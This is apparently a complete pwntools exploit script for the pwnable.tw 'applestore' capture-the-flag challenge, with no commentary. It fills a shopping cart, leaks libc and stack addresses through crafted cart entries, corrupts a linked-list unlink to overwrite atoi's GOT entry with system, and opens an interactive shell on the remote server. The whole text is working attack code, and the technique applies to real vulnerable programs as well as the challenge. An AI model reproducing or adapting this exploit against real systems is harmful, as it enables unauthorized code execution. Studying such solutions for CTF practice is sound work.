#coding=utf8
from pwn import *

server = remote('chall.pwnable.tw', 10104)
binary = ELF('./applestore')
libc = ELF('./libc_32.so.6')

for i in range(20):
	server.sendline('2')
	server.recvuntil('Device Number> ')
	server.sendline(str(2))

for i in range(6):
	server.sendline('2')
	server.recvuntil('Device Number> ')
	server.sendline(str(1))

server.sendline('5')
server.recvuntil('(y/n) > ')
server.sendline('y')
payload = 'y\x00'
payload += p32(binary.got['puts']) + p32(1) + p32(0) + p32(0)
server.sendline('4')
server.recvuntil('(y/n) > ')
server.sendline(payload)

server.recvuntil('27: ')
libc.address = u32(server.recv(4)) - libc.sym['puts']
envp = libc.sym['environ']
system = libc.sym['system']
success('libc_base: '+ hex(libc.address))

payload = 'y\x00'
payload += p32(envp) + p32(1) + p32(0) + p32(0)
server.sendline('4')
server.recvuntil('(y/n) > ')
server.sendline(payload)

server.recvuntil('27: ')
stack_envp = u32(server.recv(4))
success('stack_envp: '+ hex(stack_envp))

ebp = stack_envp - 0x104
atoi_got = binary.got['atoi']

payload = '27'
payload += p32(envp) + p32(1) + p32(ebp-0xc) + p32(atoi_got + 0x20 - 2)
server.sendline('3')
server.recvuntil('Item Number> ')
server.sendline(payload)


payload = '$0\x00\x00' + p32(system)
server.sendline(payload)

server.interactive()